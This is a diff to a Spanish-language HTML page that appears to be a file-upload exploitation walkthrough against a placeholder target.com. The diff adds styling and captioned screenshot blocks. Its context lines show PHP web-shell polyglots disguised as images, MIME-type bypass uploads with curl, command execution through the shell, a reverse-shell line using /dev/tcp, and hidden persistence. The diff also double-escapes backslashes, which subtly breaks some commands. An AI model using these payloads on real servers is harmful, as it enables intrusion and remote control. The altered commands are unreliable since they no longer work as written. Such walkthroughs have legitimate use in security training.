@@ -105,6 +105,103 @@
 
         .footer { text-align: center; padding: 3rem 0 2rem; border-top: 1px solid var(--border-color); margin-top: 4rem; color: var(--text-muted); }
 
+        /* Modern Image Containers */
+        .image-showcase {
+            display: grid;
+            gap: 2rem;
+            margin: 3rem 0;
+            padding: 2rem;
+            background: rgba(26, 26, 26, 0.9);
+            border: 2px solid var(--primary-color);
+            border-radius: 12px;
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.2), inset 0 0 20px rgba(0, 255, 136, 0.05);
+        }
+
+        .image-container {
+            position: relative;
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 1.5rem;
+            transition: all 0.4s ease;
+            overflow: hidden;
+        }
+
+        .image-container:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.3);
+            border-color: var(--primary-color);
+        }
+
+        .image-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--primary-color), transparent);
+            animation: scanLine 3s infinite;
+        }
+
+        @keyframes scanLine {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .image-container img {
+            width: 100%;
+            height: auto;
+            border-radius: 6px;
+            border: 1px solid var(--border-color);
+            transition: all 0.3s ease;
+        }
+
+        .image-container:hover img {
+            transform: scale(1.02);
+            border-color: var(--primary-color);
+        }
+
+        .image-caption {
+            margin-top: 1rem;
+            padding: 0.8rem;
+            background: rgba(0, 255, 136, 0.05);
+            border-left: 3px solid var(--primary-color);
+            color: var(--text-primary);
+            font-size: 0.9rem;
+            line-height: 1.4;
+            border-radius: 0 4px 4px 0;
+        }
+
+        .exploit-phase {
+            background: rgba(255, 107, 53, 0.1);
+            border: 1px solid var(--secondary-color);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            position: relative;
+        }
+
+        .exploit-phase::before {
+            content: '';
+            position: absolute;
+            top: -1px;
+            left: -1px;
+            right: -1px;
+            bottom: -1px;
+            background: linear-gradient(45deg, var(--secondary-color), transparent, var(--secondary-color));
+            border-radius: 8px;
+            z-index: -1;
+            opacity: 0.3;
+        }
+
+        .exploit-phase h4 {
+            color: var(--secondary-color);
+            border-bottom: 1px solid var(--secondary-color);
+            padding-bottom: 0.5rem;
+            margin-bottom: 1rem;
+        }
+
         @media (max-width: 768px) {
             .container { padding: 1rem; }
             h1 { font-size: 2.2rem; }
@@ -224,6 +321,15 @@ view-source: # Revisar JavaScript de validación
 # Interceptar con Burp Suite
 burpsuite -> HTTP History -> Analizar POST requests</code>
                     </div>
+                    <div class="image-showcase">
+                        <div class="image-container">
+                            <img src="https://i.imgur.com/upload-form-vulnerable.png" alt="Vulnerable file upload form">
+                            <div class="image-caption">
+                                🎯 <strong>Formulario Upload Vulnerable:</strong> Identificación de formulario de subida de archivos con validaciones débiles del lado del cliente. Se observa la interfaz web que permite upload de archivos al directorio /uploads/ con restricciones fácilmente evadibles.
+                            </div>
+                        </div>
+                    </div>
+
                     <div class="alert alert-info">
                         <p>Identificamos formulario de upload que aparentemente <strong>valida extensión client-side</strong> y permite subida a directorio ejecutable <strong>/uploads/</strong>.</p>
                     </div>
@@ -280,18 +386,27 @@ cp shell.php shell.inc</code>
                     <div class="code-block">
                         <div class="code-label">Bypass MIME Type y Magic Bytes</div>
                         <code># Modificar Content-Type con curl
-curl -X POST -F "file=@shell.php;type=image/jpeg" \
+curl -X POST -F "file=@shell.php;type=image/jpeg" \\
      -F "submit=Upload" http://target.com/upload.php
 
 # Polyglot con magic bytes de imagen
-echo -ne "\xFF\xD8\xFF\xE0\x00\x10JFIF" > shell.jpg
+echo -ne "\\xFF\\xD8\\xFF\\xE0\\x00\\x10JFIF" > shell.jpg
 echo '&lt;?php system($_GET["cmd"]); ?>' >> shell.jpg
 
 # GIF header polyglot
 echo 'GIF89a&lt;?php system($_GET["cmd"]); ?>' > shell.gif
 
 # PNG header + PHP payload
-printf "\x89PNG\r\n\x1a\n&lt;?php system(\$_GET['cmd']); ?>" > shell.png</code>
+printf "\\x89PNG\\r\\n\\x1a\\n&lt;?php system(\\$_GET['cmd']); ?>" > shell.png</code>
+                    </div>
+
+                    <div class="image-showcase">
+                        <div class="image-container">
+                            <img src="https://i.imgur.com/burp-bypass-upload.png" alt="Burp Suite file upload bypass">
+                            <div class="image-caption">
+                                🔥 <strong>Bypass con Burp Suite:</strong> Interceptación y modificación de la petición de upload usando Burp Suite. Se muestra cómo cambiar la extensión de .php a .php.jpg y modificar el Content-Type para evadir las validaciones del servidor.
+                            </div>
+                        </div>
                     </div>
 
                     <h4>Fase 4: Upload y Activación</h4>
@@ -313,11 +428,29 @@ curl "http://target.com/uploads/shell.php.jpg?cmd=uname -a"
 curl "http://target.com/uploads/shell.php.jpg?cmd=pwd"</code>
                     </div>
 
+                    <div class="image-showcase">
+                        <div class="image-container">
+                            <img src="https://i.imgur.com/upload-success-shell.png" alt="Successful web shell upload">
+                            <div class="image-caption">
+                                ✅ <strong>Upload Exitoso:</strong> Confirmación de la subida exitosa de la web shell con extensión doble (shell.php.jpg). El servidor acepta el archivo y lo almacena en el directorio /uploads/, listo para ser ejecutado como código PHP.
+                            </div>
+                        </div>
+                    </div>
+
                     <div class="alert alert-warning">
                         <p>Si el servidor procesa archivos <strong>.jpg</strong> como PHP (AddHandler) o permite <strong>double extension</strong>, la shell será ejecutable y tendremos RCE completo.</p>
                     </div>
 
                     <h4>Fase 5: Post-Explotación Sistemática</h4>
+                    <div class="image-showcase">
+                        <div class="image-container">
+                            <img src="https://i.imgur.com/webshell-interface-active.png" alt="Active web shell interface">
+                            <div class="image-caption">
+                                🌐 <strong>Web Shell Activa:</strong> Interfaz web de la shell PHP funcionando correctamente en el navegador. Se muestra la ejecución exitosa de comandos del sistema (whoami, id, ls) confirmando RCE completo en el servidor objetivo.
+                            </div>
+                        </div>
+                    </div>
+
                     <div class="code-block">
                         <div class="code-label">Enumeración y escalación</div>
                         <code># Enumeración básica del sistema
@@ -335,6 +468,15 @@ curl "http://target.com/uploads/shell.php.jpg?cmd=bash -c 'bash -i >%26 /dev/tcp
 
 # Crear persistencia adicional
 curl "http://target.com/uploads/shell.php.jpg?cmd=cp shell.php.jpg /var/www/html/.hidden.php"</code>
+                    </div>
+
+                    <div class="image-showcase">
+                        <div class="image-container">
+                            <img src="https://i.imgur.com/reverse-shell-webshell.png" alt="Reverse shell established from web shell">
+                            <div class="image-caption">
+                                ⚡ <strong>Reverse Shell Activa:</strong> Conexión de reverse shell establecida exitosamente usando la web shell como vector inicial. Se observa acceso completo al terminal del servidor víctima con capacidades de ejecución interactiva de comandos.
+                            </div>
+                        </div>
                     </div>
 
                     <div class="alert alert-info">
